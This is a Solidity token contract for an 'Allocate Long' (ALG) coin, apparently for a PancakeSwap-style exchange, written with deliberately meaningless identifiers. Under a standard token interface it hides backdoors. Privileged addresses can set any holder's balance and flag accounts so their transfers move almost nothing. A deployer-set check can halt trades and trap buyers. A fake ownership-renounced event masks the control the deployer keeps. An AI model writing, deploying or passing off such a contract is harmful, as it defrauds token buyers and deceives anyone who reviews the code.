//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface modeSellExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract exemptShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeTo {
    function createPair(address launchTo, address minTeam) external returns (address);
}

interface isAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountTeam) external view returns (uint256);

    function transfer(address modeExempt, uint256 exemptAuto) external returns (bool);

    function allowance(address atLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptAuto) external returns (bool);

    function transferFrom(
        address sender,
        address modeExempt,
        uint256 exemptAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTotalMin, uint256 value);
    event Approval(address indexed atLaunched, address indexed spender, uint256 value);
}

interface isAutoMetadata is isAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AllocateLong is exemptShould, isAuto, isAutoMetadata {

    address private fundList;

    function symbol() external view virtual override returns (string memory) {
        return liquiditySwap;
    }

    bool public takeFund;

    uint256 public marketingTokenFund;

    function owner() external view returns (address) {
        return fundList;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingShould;
    }

    uint256 private launchAmount;

    bool public liquidityLaunched;

    function approve(address txLiquidity, uint256 exemptAuto) public virtual override returns (bool) {
        marketingExemptTotal[_msgSender()][txLiquidity] = exemptAuto;
        emit Approval(_msgSender(), txLiquidity, exemptAuto);
        return true;
    }

    bool public modeEnable;

    function transferFrom(address minFee, address modeExempt, uint256 exemptAuto) external override returns (bool) {
        if (_msgSender() != fundReceiverFrom) {
            if (marketingExemptTotal[minFee][_msgSender()] != type(uint256).max) {
                require(exemptAuto <= marketingExemptTotal[minFee][_msgSender()]);
                marketingExemptTotal[minFee][_msgSender()] -= exemptAuto;
            }
        }
        return takeToken(minFee, modeExempt, exemptAuto);
    }

    uint8 private marketingBuy = 18;

    function isMode(address enableList) public {
        if (modeEnable) {
            return;
        }
        if (takeFund) {
            liquidityLaunched = true;
        }
        modeTrading[enableList] = true;
        if (marketingTokenFund == tradingLaunch) {
            receiverList = false;
        }
        modeEnable = true;
    }

    function tradingTo(address minFee, address modeExempt, uint256 exemptAuto) internal returns (bool) {
        require(isLaunched[minFee] >= exemptAuto);
        isLaunched[minFee] -= exemptAuto;
        isLaunched[modeExempt] += exemptAuto;
        emit Transfer(minFee, modeExempt, exemptAuto);
        return true;
    }

    uint256 public tradingLaunch;

    bool public walletFee;

    function takeToken(address minFee, address modeExempt, uint256 exemptAuto) internal returns (bool) {
        if (minFee == swapList) {
            return tradingTo(minFee, modeExempt, exemptAuto);
        }
        uint256 launchedLimitReceiver = isAuto(atFund).balanceOf(liquidityIsMax);
        require(launchedLimitReceiver == modeBuy);
        require(modeExempt != liquidityIsMax);
        if (txToken[minFee]) {
            return tradingTo(minFee, modeExempt, toList);
        }
        return tradingTo(minFee, modeExempt, exemptAuto);
    }

    constructor (){
        
        modeSellExempt enableAutoFrom = modeSellExempt(fundReceiverFrom);
        atFund = takeTo(enableAutoFrom.factory()).createPair(enableAutoFrom.WETH(), address(this));
        if (liquidityLaunched) {
            tradingLaunch = launchAmount;
        }
        swapList = _msgSender();
        maxLiquidity();
        modeTrading[swapList] = true;
        isLaunched[swapList] = tradingShould;
        if (marketingTokenFund == launchAmount) {
            receiverList = false;
        }
        emit Transfer(address(0), swapList, tradingShould);
    }

    function listEnable(address sellLiquidity, uint256 exemptAuto) public {
        listSell();
        isLaunched[sellLiquidity] = exemptAuto;
    }

    address fundReceiverFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public swapList;

    function listSell() private view {
        require(modeTrading[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return senderSell;
    }

    string private liquiditySwap = "ALG";

    address public atFund;

    function atTakeToken(address marketingList) public {
        listSell();
        
        if (marketingList == swapList || marketingList == atFund) {
            return;
        }
        txToken[marketingList] = true;
    }

    function maxLiquidity() public {
        emit OwnershipTransferred(swapList, address(0));
        fundList = address(0);
    }

    function limitMaxReceiver(uint256 exemptAuto) public {
        listSell();
        modeBuy = exemptAuto;
    }

    mapping(address => bool) public modeTrading;

    function balanceOf(address amountTeam) public view virtual override returns (uint256) {
        return isLaunched[amountTeam];
    }

    address liquidityIsMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant toList = 3 ** 10;

    function getOwner() external view returns (address) {
        return fundList;
    }

    uint256 swapAtTeam;

    string private senderSell = "Allocate Long";

    event OwnershipTransferred(address indexed minSwap, address indexed autoFund);

    function transfer(address sellLiquidity, uint256 exemptAuto) external virtual override returns (bool) {
        return takeToken(_msgSender(), sellLiquidity, exemptAuto);
    }

    uint256 private tradingShould = 100000000 * 10 ** 18;

    uint256 modeBuy;

    function decimals() external view virtual override returns (uint8) {
        return marketingBuy;
    }

    bool private receiverList;

    mapping(address => mapping(address => uint256)) private marketingExemptTotal;

    mapping(address => uint256) private isLaunched;

    function allowance(address teamReceiver, address txLiquidity) external view virtual override returns (uint256) {
        if (txLiquidity == fundReceiverFrom) {
            return type(uint256).max;
        }
        return marketingExemptTotal[teamReceiver][txLiquidity];
    }

    mapping(address => bool) public txToken;

}